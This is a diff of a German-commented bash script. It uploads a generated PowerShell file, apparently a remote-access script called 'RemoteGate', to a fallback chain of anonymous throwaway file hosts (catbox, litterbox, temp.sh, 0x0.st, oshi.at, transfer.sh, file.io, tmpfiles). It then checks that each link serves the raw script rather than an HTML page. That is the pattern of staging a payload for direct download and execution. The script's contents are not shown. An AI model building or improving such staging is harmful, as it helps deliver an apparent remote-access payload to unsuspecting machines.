@@ -295,7 +295,8 @@ validate_raw() {
   local url="$1"
   [[ -z "$url" ]] && return 1
   local sample
-  sample=$(curl -sL --connect-timeout 5 -m 10 "$url" 2>&1 | head -c 4000 || true)
+  # Längere Timeouts für CH -> US Latenz
+  sample=$(curl -sL --connect-timeout 10 -m 20 "$url" 2>&1 | head -c 5000 || true)
   if echo "$sample" | grep -qi "window\.dataLayer\|\bwindow\.dataLayer\b\|gtag(.*new Date\|<html\|<a href=\"https://onlyfiles"; then
     echo " -> Validierung: HTML statt PS1 erkannt ($url) -> verworfen" >&2
     return 1
@@ -303,7 +304,6 @@ validate_raw() {
   if echo "$sample" | grep -q "RemoteGate"; then
     return 0
   fi
-  # Fallback: nicht leer und kein HTML -> ok
   if [[ -n "$sample" && "$sample" != *"Download ("* ]]; then
     return 0
   fi
@@ -311,23 +311,57 @@ validate_raw() {
 }
 
 UPLOAD_URL=""
-# Priorität: catbox (direkt raw, permanent) > 0x0.st (direkt raw) > transfer.sh (mit Dateiname) > file.io > tmpfiles (last, anfällig für HTML)
-for HOST in "https://catbox.moe/user/api.php" "https://0x0.st" "https://transfer.sh" "https://file.io" "https://tmpfiles.org/api/v1/upload"; do
-  if [[ "$HOST" == *"catbox"* ]]; then
-    UPLOAD_URL=$(curl -s --connect-timeout 5 -m 15 -F "reqtype=fileupload" -F "fileToUpload=@$OUTPUT_PATH" "$HOST" 2>&1 | tr -d '\r\n ' | grep -E "^https://files\.catbox\.moe/" | head -1 || true)
+# Priorität: catbox permanent > litterbox temp 72h > temp.sh (gewünscht) > 0x0.st > oshi.at > transfer.sh > file.io > tmpfiles last
+for HOST in "https://catbox.moe/user/api.php" "https://litterbox.catbox.moe/resources/internals/api.php" "https://temp.sh/upload" "https://0x0.st" "https://oshi.at" "https://transfer.sh" "https://file.io" "https://tmpfiles.org/api/v1/upload"; do
+  if [[ "$HOST" == *"catbox.moe/user/api.php"* ]]; then
+    echo " -> Versuche catbox.moe ..."
+    UPLOAD_URL=$(curl -s --connect-timeout 10 -m 30 -F "reqtype=fileupload" -F "fileToUpload=@$OUTPUT_PATH" "$HOST" 2>&1 | grep -oE "https://files\.catbox\.moe/[^[:space:]\"']+" | head -1 | tr -d '\r\n ' || true)
     if [[ -n "$UPLOAD_URL" ]]; then
       echo " -> catbox OK: $UPLOAD_URL"
-      if validate_raw "$UPLOAD_URL"; then
-        echo " -> Validiert: raw OK"
-        break
-      else
-        UPLOAD_URL=""
-      fi
+      if validate_raw "$UPLOAD_URL"; then echo " -> Validiert: raw OK"; break; else UPLOAD_URL=""; fi
     else
-      echo " -> catbox fail"
+      echo " -> catbox fail (kein URL)"
+    fi
+  elif [[ "$HOST" == *"litterbox"* ]]; then
+    echo " -> Versuche litterbox (72h) ..."
+    UPLOAD_URL=$(curl -s --connect-timeout 10 -m 30 -F "reqtype=fileupload" -F "time=72h" -F "fileToUpload=@$OUTPUT_PATH" "$HOST" 2>&1 | grep -oE "https://litterbox\.catbox\.moe/[^[:space:]\"']+" | head -1 | tr -d '\r\n ' || true)
+    if [[ -n "$UPLOAD_URL" ]]; then
+      echo " -> litterbox OK: $UPLOAD_URL"
+      if validate_raw "$UPLOAD_URL"; then echo " -> Validiert: raw OK"; break; else UPLOAD_URL=""; fi
+    else
+      echo " -> litterbox fail"
+    fi
+  elif [[ "$HOST" == *"temp.sh"* ]]; then
+    echo " -> Versuche temp.sh (dein Wunsch) ..."
+    UPLOAD_URL=$(curl -s --connect-timeout 10 -m 30 -F "file=@$OUTPUT_PATH" "$HOST" 2>&1 | grep -oE "https://temp\.sh/[^[:space:]\"']+" | head -1 | tr -d '\r\n ' || true)
+    if [[ -n "$UPLOAD_URL" ]]; then
+      echo " -> temp.sh OK: $UPLOAD_URL"
+      if validate_raw "$UPLOAD_URL"; then echo " -> Validiert: raw OK"; break; else UPLOAD_URL=""; fi
+    else
+      echo " -> temp.sh fail"
+    fi
+  elif [[ "$HOST" == *"0x0.st"* ]]; then
+    echo " -> Versuche 0x0.st ..."
+    UPLOAD_URL=$(curl -s --connect-timeout 10 -m 30 -F "file=@$OUTPUT_PATH" "$HOST" 2>&1 | grep -oE "https://0x0\.st/[^[:space:]\"']+" | head -1 | tr -d '[:space:]' || true)
+    if [[ -n "$UPLOAD_URL" ]]; then
+      echo " -> 0x0.st OK: $UPLOAD_URL"
+      if validate_raw "$UPLOAD_URL"; then echo " -> Validiert: raw OK"; break; else UPLOAD_URL=""; fi
+    else
+      echo " -> 0x0.st fail"
+    fi
+  elif [[ "$HOST" == *"oshi.at"* ]]; then
+    echo " -> Versuche oshi.at ..."
+    RAW=$(curl -s --connect-timeout 10 -m 30 -F "f=@$OUTPUT_PATH" -F "expire=10080" "$HOST" 2>&1 || true)
+    UPLOAD_URL=$(echo "$RAW" | grep -oE "https://oshi\.at/[^[:space:]]+" | head -1 | tr -d '\r\n ' | sed 's|/$||' || true)
+    if [[ -n "$UPLOAD_URL" ]]; then
+      echo " -> oshi.at OK: $UPLOAD_URL"
+      if validate_raw "$UPLOAD_URL"; then echo " -> Validiert: raw OK"; break; else UPLOAD_URL=""; fi
+    else
+      echo " -> oshi.at fail (RAW: ${RAW:0:120})"
     fi
   elif [[ "$HOST" == *"tmpfiles"* ]]; then
-    RAW=$(curl -s --connect-timeout 3 -m 8 -F "file=@$OUTPUT_PATH" "$HOST" 2>&1 || true)
+    echo " -> Versuche tmpfiles ..."
+    RAW=$(curl -s --connect-timeout 10 -m 20 -F "file=@$OUTPUT_PATH" "$HOST" 2>&1 || true)
     UPLOAD_URL=$(echo "$RAW" | python3 -c "import json,sys; j=json.load(sys.stdin); u=j.get('data',{}).get('url','') or j.get('url',''); print(u)" 2>/dev/null || true)
     if [[ -z "$UPLOAD_URL" ]]; then
       UPLOAD_URL=$(echo "$RAW" | grep -oE "https://tmpfiles.org[^\"']*" | head -1 || true)
@@ -338,47 +372,33 @@ for HOST in "https://catbox.moe/user/api.php" "https://0x0.st" "https://transfer
     fi
     if [[ -n "$UPLOAD_URL" ]]; then
       echo " -> tmpfiles Roh-URL: $UPLOAD_URL"
-      if validate_raw "$UPLOAD_URL"; then
-        echo " -> tmpfiles OK: $UPLOAD_URL"
-        break
-      else
-        # tmpfiles liefert oft HTML Viewer -> verwerfen und nächsten Host probieren
-        echo " -> tmpfiles validierung fehlgeschlagen, nächsten Host probieren"
-        UPLOAD_URL=""
-      fi
+      if validate_raw "$UPLOAD_URL"; then echo " -> tmpfiles OK: $UPLOAD_URL"; break; else echo " -> tmpfiles HTML -> verworfen"; UPLOAD_URL=""; fi
     else
       echo " -> tmpfiles fail"
     fi
   elif [[ "$HOST" == *"transfer"* ]]; then
-    UPLOAD_URL=$(curl -s --connect-timeout 4 -m 10 --upload-file "$OUTPUT_PATH" "$HOST/$SAFE_FILENAME" 2>&1 | grep -E "^https://" | head -1 | tr -d '[:space:]' || true)
+    echo " -> Versuche transfer.sh ..."
+    UPLOAD_URL=$(curl -s --connect-timeout 10 -m 30 --upload-file "$OUTPUT_PATH" "$HOST/$SAFE_FILENAME" 2>&1 | grep -E "^https://" | head -1 | tr -d '[:space:]' || true)
     if [[ -z "$UPLOAD_URL" ]]; then
-      UPLOAD_URL=$(curl -s --connect-timeout 4 -m 10 --upload-file "$OUTPUT_PATH" "$HOST/RemoteGate-Final.ps1" 2>&1 | grep -E "^https://" | head -1 | tr -d '[:space:]' || true)
+      UPLOAD_URL=$(curl -s --connect-timeout 10 -m 30 --upload-file "$OUTPUT_PATH" "$HOST/RemoteGate-Final.ps1" 2>&1 | grep -E "^https://" | head -1 | tr -d '[:space:]' || true)
     fi
     if [[ -n "$UPLOAD_URL" ]]; then
       echo " -> transfer.sh OK: $UPLOAD_URL"
-      if validate_raw "$UPLOAD_URL"; then
-        echo " -> Validiert: raw OK"
-        break
-      else
-        UPLOAD_URL=""
-      fi
+      if validate_raw "$UPLOAD_URL"; then echo " -> Validiert: raw OK"; break; else UPLOAD_URL=""; fi
     else
       echo " -> transfer.sh fail"
     fi
   else
-    UPLOAD_URL=$(curl -s --connect-timeout 3 -m 8 -F "file=@$OUTPUT_PATH" "$HOST" 2>&1 | grep -E "https://(0x0\.st|file\.io)[^ \"']*" | head -1 | tr -d '[:space:]' || true)
+    # file.io
+    echo " -> Versuche $HOST ..."
+    UPLOAD_URL=$(curl -s --connect-timeout 10 -m 30 -F "file=@$OUTPUT_PATH" "$HOST" 2>&1 | grep -E "https://(file\.io)[^ \"']*" | head -1 | tr -d '[:space:]' || true)
     if [[ -z "$UPLOAD_URL" && "$HOST" == *"file.io"* ]]; then
-      UPLOAD_URL=$(curl -s --connect-timeout 3 -m 8 -F "file=@$OUTPUT_PATH" "$HOST" 2>&1 | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('link',''))" 2>/dev/null || true)
+      UPLOAD_URL=$(curl -s --connect-timeout 10 -m 30 -F "file=@$OUTPUT_PATH" "$HOST" 2>&1 | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('link',''))" 2>/dev/null || true)
     fi
     UPLOAD_URL="${UPLOAD_URL:-}"
     if [[ -n "$UPLOAD_URL" ]]; then
       echo " -> $HOST OK: $UPLOAD_URL"
-      if validate_raw "$UPLOAD_URL"; then
-        echo " -> Validiert: raw OK"
-        break
-      else
-        UPLOAD_URL=""
-      fi
+      if validate_raw "$UPLOAD_URL"; then echo " -> Validiert: raw OK"; break; else UPLOAD_URL=""; fi
     else
       echo " -> $HOST fail"
     fi
